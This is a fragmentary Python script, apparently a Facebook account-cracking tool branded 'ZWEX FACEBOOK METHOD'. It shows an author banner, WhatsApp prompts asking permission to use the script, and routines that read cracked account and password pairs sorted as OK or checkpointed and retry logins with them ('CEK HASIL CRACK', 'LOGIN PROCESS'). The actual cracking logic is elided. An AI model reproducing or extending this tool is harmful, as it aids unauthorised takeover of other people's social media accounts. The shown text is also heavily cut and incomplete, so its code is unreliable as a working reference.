...
╚══███╔╝██║    ██║██╔════╝╚██╗██╔╝
 ...
 ███╔╝  ██║███╗██║██╔══╝   ██╔██╗ 
███████╗╚███╔███╔╝███████╗██╔╝ ██╗
╚══════╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝\n{N} ▌│█║▌║▌║ZWEX FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : ZWEX-XD                   {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +628....................          {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/Nazir765/META{N}  ║")
    ...
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                try:
                    log_hasil(titid[0].replace("[NAZIR-CP] ", ""), titid[1])
            ...
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python META.py{N}'");exit()
        else:
...
def cek_pw():
    try:
        ...
        if pil =="":
            ...
            os.system('xdg-open https://wa.me/+923025669420?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
...
def infoauthor():
        print("%s══════════════════════════════════════════"%(N))
        #jalan(f" {BM}{P}SC INFO{N}\n [{H}•{N}] Author SC : {K}NAZIR-XD\n {N}[{H}•{N}] Whatsapp : {K}+923025669420\n {N}[{H}•{N}] Github : {K}https://github.com/Nazir765\n {N}[{H}•{N}] 
        ...
        if upd =="":
            ...
            os.system('xdg-open https://wa.me/03025669420?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);exit()
        elif upd in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] Ok, thank you...")
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[ZWEX-OK] ","\x1b[1;92m[ZWEX-OK] ").replace("[ROY-CP] ", "\x1b[1;93m[ROY-CP] ")
...
def gabut():
    ...
    for memek in buka_baju:
        ...
        titid  = kontol.split(' • ')
        print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
        jalan(f' {N}[{M}?{N}] Akun : {K}{kontol.replace("[ALIM-CP] ", "")}{N}')
        try:
            log_hasil(titid[0].replace("[ALIM-CP] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
            print("")
    print("")
    jalan(' %s[%s✓%s] %sProses pengecekan selesai%s'%(N,H,N,H,N))
    jalan(' %s[%s✓%s] Retrun SC type "%spython META.py%s"'%(N,H,N,H,N));exit()
# CHEKPOINT DETEDTOR
